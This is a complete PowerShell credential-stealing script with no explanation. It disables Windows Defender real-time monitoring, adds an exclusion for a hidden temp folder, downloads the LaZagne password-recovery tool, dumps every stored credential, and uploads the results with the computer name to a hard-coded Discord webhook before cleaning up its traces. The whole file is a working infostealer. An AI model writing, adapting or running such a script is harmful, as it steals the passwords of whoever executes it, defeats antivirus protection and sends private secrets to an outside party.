$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$dir = "$env:temp\JHknfuiD"
if (!(Test-Path -Path "$dir")) {
New-Item -ItemType Directory -Path "$dir"
}
if (-not $version) {
  $version = "2.4.5"
}
$log = "$dir\output.txt"
$verm = "v$version"
$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
if ($Admin -eq 'True') {
  Set-MpPreference -DisableRealtimeMonitoring $true

  Add-MpPreference -ExclusionPath "$dir"
}
$hide = Get-Item "$dir" -Force
$hide.attributes='Hidden'
Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
& "$dir\lazagne.exe" all -vv > "$log"
curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
Start-Sleep -Seconds 20
if ($Admin -eq 'True'){
  Set-MpPreference -DisableRealtimeMonitoring $false

  Remove-MpPreference -ExclusionPath "$dir"
}
$unhide = Get-Item "$dir" -Force
$unhide.attributes='Normal'
Remove-Item -Path "$dir" -Recurse -Force
